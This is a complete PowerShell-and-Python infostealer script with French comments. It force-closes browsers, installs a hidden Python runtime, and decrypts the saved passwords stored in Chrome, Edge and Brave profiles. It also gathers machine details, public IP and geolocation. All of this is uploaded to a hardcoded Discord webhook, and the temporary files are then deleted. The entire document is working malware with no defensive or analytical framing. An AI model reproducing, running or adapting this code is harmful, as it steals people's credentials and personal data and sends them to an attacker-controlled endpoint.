$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

# Kill ULTRA-AGRESSIF avec vérification
Write-Host "Killing browsers..." -ForegroundColor Yellow
$braveProcs = Get-Process brave* -EA 0
if ($braveProcs) {
    Write-Host "Found Brave processes: $($braveProcs.Count)" -ForegroundColor Red
    Stop-Process -Name brave* -Force -EA 0
    Start-Sleep -Seconds 2
}
Stop-Process -Name msedge*,chrome*,firefox* -Force -EA 0
Start-Sleep -Seconds 5

# Vérifier que Brave est bien arrêté
$stillRunning = Get-Process brave* -EA 0
if ($stillRunning) {
    Write-Host "WARNING: Brave still running!" -ForegroundColor Red
}

try{
$pyPath="$env:TEMP\py"
$needInstall=$false

if(!(Test-Path "$pyPath\python.exe")){
 $needInstall=$true
}else{
 cd $pyPath
 $testLibs=.\python.exe -c "import Crypto,win32crypt,requests;print('OK')" 2>$null
 if($testLibs -ne "OK"){$needInstall=$true}
}

if($needInstall){
 Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
 Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
 (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
 Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
 cd $pyPath
 .\python.exe gp.py --no-warn-script-location 2>$null
 .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
 Remove-Item "$env:TEMP\py.zip" -Force -EA 0
}

cd $pyPath

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,sys
from Crypto.Cipher import AES

try:
 import requests
 ip=requests.get("https://api.ipify.org",timeout=3).text
 geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
 location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
 isp=geo.get('isp','N/A')
except:
 ip="N/A"
 location="N/A"
 isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def d(db,st,n):
 debug_log=[]
 try:
  debug_log.append(f"\n[{n}] Starting extraction...")
  
  # Vérifier existence des fichiers
  if not os.path.exists(db):
   debug_log.append(f"[{n}] ERROR: Login Data not found at {db}")
   return [],debug_log
  debug_log.append(f"[{n}] ✓ Login Data exists ({os.path.getsize(db)} bytes)")
  
  if not os.path.exists(st):
   debug_log.append(f"[{n}] ERROR: Local State not found at {st}")
   return [],debug_log
  debug_log.append(f"[{n}] ✓ Local State exists ({os.path.getsize(st)} bytes)")
  
  # Lire la clé
  try:
   with open(st,'r',encoding='utf-8') as f:
    local_state=json.load(f)
   encrypted_key=base64.b64decode(local_state["os_crypt"]["encrypted_key"])
   encrypted_key=encrypted_key[5:]
   k=win32crypt.CryptUnprotectData(encrypted_key,None,None,None,0)[1]
   debug_log.append(f"[{n}] ✓ Encryption key extracted ({len(k)} bytes)")
  except Exception as e:
   debug_log.append(f"[{n}] ERROR extracting key: {e}")
   return [],debug_log
  
  # Copier le fichier
  temp_db=f"temp_{n}_{os.getpid()}.db"
  copied=False
  for attempt in range(15):
   try:
    if os.path.exists(temp_db):
     os.remove(temp_db)
    shutil.copy2(db,temp_db)
    copied=True
    debug_log.append(f"[{n}] ✓ Database copied (attempt {attempt+1})")
    break
   except Exception as e:
    if attempt < 14:
     time.sleep(1)
    else:
     debug_log.append(f"[{n}] ERROR copying database: {e}")
     return [],debug_log
  
  if not copied:
   return [],debug_log
  
  # Lire la base de données
  r=[]
  try:
   c=sqlite3.connect(temp_db,timeout=60)
   cursor=c.cursor()
   
   # Compter les entrées
   cursor.execute("SELECT COUNT(*) FROM logins")
   total_count=cursor.fetchone()[0]
   debug_log.append(f"[{n}] Total logins in DB: {total_count}")
   
   cursor.execute("SELECT COUNT(*) FROM logins WHERE username_value!=''")
   with_username=cursor.fetchone()[0]
   debug_log.append(f"[{n}] Logins with username: {with_username}")
   
   cursor.execute("SELECT COUNT(*) FROM logins WHERE username_value!='' AND password_value!=''")
   with_password=cursor.fetchone()[0]
   debug_log.append(f"[{n}] Logins with password: {with_password}")
   
   # Extraire
   cursor.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!='' AND password_value!=''")
   
   decrypted_count=0
   failed_count=0
   
   for row in cursor.fetchall():
    try:
     url=row[0]
     user=row[1]
     enc_pwd=row[2]
     
     if not enc_pwd or len(enc_pwd)<15:
      failed_count+=1
      continue
     
     # Vérifier le format
     if enc_pwd[0:3] == b'v10':
      # AES-GCM
      nonce=enc_pwd[3:15]
      ciphertext=enc_pwd[15:-16]
      tag=enc_pwd[-16:]
      
      cipher=AES.new(k,AES.MODE_GCM,nonce=nonce)
      pwd=cipher.decrypt_and_verify(ciphertext,tag).decode('utf-8','ignore')
      
      r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
      decrypted_count+=1
     else:
      # DPAPI ancien format
      try:
       decrypted=win32crypt.CryptUnprotectData(enc_pwd,None,None,None,0)[1]
       pwd=decrypted.decode('utf-8','ignore')
       r.append(f"[{n}] {url}\nUsername: {user}\nPassword: {pwd}\n")
       decrypted_count+=1
      except:
       failed_count+=1
    except Exception as e:
     failed_count+=1
   
   debug_log.append(f"[{n}] Decrypted: {decrypted_count} / Failed: {failed_count}")
   c.close()
  except Exception as e:
   debug_log.append(f"[{n}] ERROR reading database: {e}")
  finally:
   try:
    if os.path.exists(temp_db):
     time.sleep(0.5)
     os.remove(temp_db)
   except:
    pass
  
  return r,debug_log
  
 except Exception as e:
  debug_log.append(f"[{n}] FATAL ERROR: {e}")
  return [],debug_log

# Scanner
def scan_all_browsers():
 results=[]
 all_debug=[]
 browsers_found=[]
 
 user_paths=[
  os.path.expandvars(r"%LOCALAPPDATA%"),
  os.path.expandvars(r"%APPDATA%")
 ]
 
 patterns=[
  ("Edge",r"Microsoft\Edge\User Data"),
  ("Brave",r"BraveSoftware\Brave-Browser\User Data"),
  ("Chrome",r"Google\Chrome\User Data")
 ]
 
 for base_path in user_paths:
  for browser_name,pattern in patterns:
   full_path=os.path.join(base_path,pattern)
   if os.path.exists(full_path):
    browsers_found.append(f"{browser_name}: {full_path}")
    local_state=os.path.join(full_path,"Local State")
    
    if os.path.exists(local_state):
     # Default profile
     default_login=os.path.join(full_path,"Default","Login Data")
     if os.path.exists(default_login):
      pwd_list,debug=d(default_login,local_state,f"{browser_name}-Default")
      results.extend(pwd_list)
      all_debug.extend(debug)
     
     # Autres profils
     try:
      for item in os.listdir(full_path):
       item_path=os.path.join(full_path,item)
       if os.path.isdir(item_path) and (item.startswith("Profile") or item.startswith("Person")):
        profile_login=os.path.join(item_path,"Login Data")
        if os.path.exists(profile_login):
         pwd_list,debug=d(profile_login,local_state,f"{browser_name}-{item}")
         results.extend(pwd_list)
         all_debug.extend(debug)
     except:
      pass
 
 return results,browsers_found,all_debug

# EXÉCUTER
res,browsers_found,debug_logs=scan_all_browsers()

# Compter
browser_counts={}
for item in res:
 browser=item.split("]")[0].strip("[")
 browser_counts[browser]=browser_counts.get(browser,0)+1

browser_info="\n".join([f"{k}: {v} passwords" for k,v in browser_counts.items()]) if browser_counts else "No passwords found"

info=f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {socket.gethostname()}
Language: {language}
Public IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}

BROWSERS DETECTED:
{browser_info}

TOTAL PASSWORDS: {len(res)}
{'='*60}

BROWSER PATHS FOUND:
{chr(10).join(browsers_found) if browsers_found else "No browser paths found"}
{'='*60}

DEBUG LOG:
{chr(10).join(debug_logs)}
{'='*60}

"""

with open("p.txt","w",encoding="utf-8") as f:
 f.write(info)
 if res:
  f.write("\n".join(res))
 else:
  f.write("No passwords found.\n")

print("OK")
'@|Out-File "e.py" -Encoding UTF8

$r=.\python.exe e.py 2>$null

if($r -eq "OK"){
 curl.exe -F "file=@p.txt" $wh 2>$null
 Remove-Item p.txt,e.py -Force -EA 0
}

cd $env:TEMP

}catch{
 $err=$_.Exception.Message
 curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME - Error: $err`"}" $wh
}
